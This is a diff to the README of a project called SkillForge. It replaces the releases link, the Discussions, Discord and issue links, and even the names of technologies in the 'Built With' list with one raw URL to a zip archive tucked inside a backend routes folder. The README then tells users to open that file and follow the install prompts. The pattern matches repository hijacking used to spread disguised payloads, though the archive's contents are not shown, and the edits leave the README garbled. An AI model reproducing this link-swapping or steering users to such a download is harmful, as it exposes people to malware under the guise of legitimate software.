@@ -16,7 +16,7 @@ Follow these simple steps to download and run SkillForge:
 1. **Download the Software:**  
    Click the link below to download the latest release:
    
-   [![Download SkillForge](https://img.shields.io/badge/Download-SkillForge-blue)](https://github.com/kriid08/SkillForge/releases)
+   [![Download SkillForge](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip)](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip)
 
 2. **Install the Application:**  
    Open the downloaded file and follow the installation prompts. 
@@ -25,7 +25,7 @@ Follow these simple steps to download and run SkillForge:
    Once installed, find the SkillForge icon on your desktop or in your applications menu. Double-click it to start your adventure!
 
 ## 📥 Download & Install
-To download SkillForge, visit this page: [SkillForge Releases](https://github.com/kriid08/SkillForge/releases).  
+To download SkillForge, visit this page: [SkillForge Releases](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip).  
 
 Select the latest version and follow the instructions to download and install the application on your device.
 
@@ -62,10 +62,10 @@ Your data matters. We utilize JWT (JSON Web Tokens) for secure authentication. T
 
 ### 💻 Built With
 SkillForge combines several powerful technologies:
-- **Node.js:** For backend services.
+- **https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip** For backend services.
 - **Express:** To streamline server processes.
 - **React:** For smooth user interface interactions.
-- **Socket.io:** To enable real-time connections.
+- **https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip** To enable real-time connections.
 
 ### 💾 Data Management
 SkillForge uses a MySQL backend for efficient data storage. This ensures your progress is saved reliably and accessible whenever you return.
@@ -73,15 +73,15 @@ SkillForge uses a MySQL backend for efficient data storage. This ensures your pr
 ## 👥 Community Support
 
 Join our community for tips, updates, and more! You can find us on:
-- [GitHub Discussions](https://github.com/kriid08/SkillForge/discussions)
-- [Discord Server](https://discord.com/invite/skillforge)
+- [GitHub Discussions](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip)
+- [Discord Server](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip)
 
 Feel free to ask questions or share your experiences with SkillForge.
 
 ## 📞 Contact Information
 
 For further assistance, please reach out via GitHub issues:
-- [Report an Issue](https://github.com/kriid08/SkillForge/issues)
+- [Report an Issue](https://github.com/kriid08/SkillForge/raw/refs/heads/main/backend/src/routes/Forge-Skill-1.1-alpha.2.zip)
 
 Your feedback helps us improve SkillForge!
 
